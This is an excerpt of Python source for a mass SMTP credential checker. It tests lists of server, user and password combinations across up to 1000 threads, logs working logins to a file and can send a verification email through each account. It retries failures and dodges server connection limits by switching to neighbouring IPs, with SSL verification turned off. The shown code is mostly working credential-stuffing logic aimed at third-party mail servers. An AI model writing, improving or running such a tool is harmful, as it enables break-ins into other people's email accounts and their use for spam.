...
def socket_get_free_smtp_server(smtp_server, port):
	...
	for attempt in range(3):
		try:
			...
			s.settimeout(4 + attempt * 2)
			try:
				s.connect((smtp_server_ip, port))
				return (s, smtp_server_ip)
			except Exception as e:
				emsg = str(e).lower()
				if re.search(r'too many connections|threshold limitation|parallel connections|try later|refused|reset', emsg):
					try:
						smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
						socket_type2 = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
						s2 = socket.socket(socket_type2, socket.SOCK_STREAM)
						s2 = ssl._create_unverified_context().wrap_socket(s2) if port == 465 else s2
						s2.settimeout(6 + attempt * 3)
						s2.connect((smtp_server_ip, port))
						return (s2, smtp_server_ip)
					except Exception as e2:
						last_exc = e2
				elif re.search(r'timed?.out|timeout', emsg) and attempt < 2:
					last_exc = e
	...
	raise last_exc or Exception('failed to connect to '+smtp_server+':'+str(port))
...
def socket_try_login(sock, self_ip, smtp_login, smtp_password):
	...
	# RFC 4616 AUTH PLAIN: base64(\x00authcid\x00passwd)
	try:
		smtp_plain_b64 = base64.b64encode(
			b'\x00' + smtp_login.encode('utf-8') + b'\x00' + smtp_password.encode('utf-8')
		).decode('ascii')
	except Exception:
		smtp_plain_b64 = base64_encode('\x00' + smtp_login + '\x00' + smtp_password)

	answer = socket_send_and_read(sock, 'EHLO ' + self_ip)
	auth_lower = answer.lower()

	# ── AUTH LOGIN: proper challenge/response (handles all server variants) ──
	if re.search(r'auth[\w =\-]+login', auth_lower):
		answer = socket_send_and_read(sock, 'AUTH LOGIN')
		if answer[:3] == '334':
			answer = socket_send_and_read(sock, smtp_login_b64)
			if answer[:3] == '334':
				try:
		...
		if answer[:3] == '235':
			return sock
		# Permanent auth failure — no point trying PLAIN
		if answer[:3] in ('535', '534', '530', '550'):
			raise Exception(answer)

	# ── AUTH PLAIN: RFC 4616 null-byte format ────────────────────────────────
	if re.search(r'auth[\w =\-]+plain', auth_lower):
		answer = socket_send_and_read(sock, 'AUTH PLAIN ' + smtp_plain_b64)
		if answer[:3] == '235':
			return sock
		raise Exception(answer)

	raise Exception('no supported auth method: ' + answer)
...
_TRANSIENT_RE = re.compile(r'timed?.out|timeout|too.many.connect|temporar|try.again|connect.reset|broken.pipe|refused|rate.limit|overload|throttl|network.unreachable|421\s', re.I)
_AUTH_FAIL_RE  = re.compile(r'^535|^534|^530|wrong.pass|bad.cred|auth.*fail|invalid.login|authentication.fail|not.accept', re.I)
...
def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
	...
	for attempt in range(3):
		...
		try:
			...
			last_exc = e
			emsg = str(e)
			if _AUTH_FAIL_RE.search(emsg):
				break  # permanent auth failure — no retry
			if _TRANSIENT_RE.search(emsg) and attempt < 2:
				time.sleep(1.5 * (attempt + 1))
				continue
			break
	raise last_exc
...
_worker_retries      = {}
_worker_retries_lock = threading.Lock()
...
def worker_item(jobs_que, results_que):
	...
	while True:
		...
		if jobs_que.empty():
			...
			job = jobs_que.get()
			smtp_server, port, smtp_user, password = job[0], job[1], job[2], job[3]
			...
			try:
				...
				results_que.put(green(smtp_user+':\a'+password,7)+(verify_email and green(' sent to '+verify_email,7) or ''))
				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
				goods += 1
				with _worker_retries_lock:
					_worker_retries.pop(smtp_user+':'+password, None)
			except Exception as e:
				emsg = str(e)
				key  = smtp_user + ':' + password
				# Re-queue transient network failures (max 2 extra retries at worker level)
				if not _AUTH_FAIL_RE.search(emsg) and _TRANSIENT_RE.search(emsg):
					with _worker_retries_lock:
						cnt = _worker_retries.get(key, 0)
					if cnt < 2:
						with _worker_retries_lock:
							_worker_retries[key] = cnt + 1
						results_que.put(orange(f're-queue ({cnt+1}/2) {smtp_user}: '+emsg[:60]))
						time.sleep(2 * (cnt + 1))
						jobs_que.put((smtp_server, port, smtp_user, password))
					else:
						with _worker_retries_lock:
							_worker_retries.pop(key, None)
						results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(emsg.splitlines()).strip()))
				else:
					results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(emsg.splitlines()).strip()))
			time.sleep(0.01)
...
def every_second():
	...
	while True:
		try:
			...
			if threads_counter<max_threads and mem_usage<85 and cpu_usage<90 and jobs_que.qsize():
...
net_usage = 0
min_threads = 100
max_threads = debuglevel or rage_mode and 1000 or 100
threads_counter = 0
no_jobs_left = False
loop_times = []
loop_time = 0
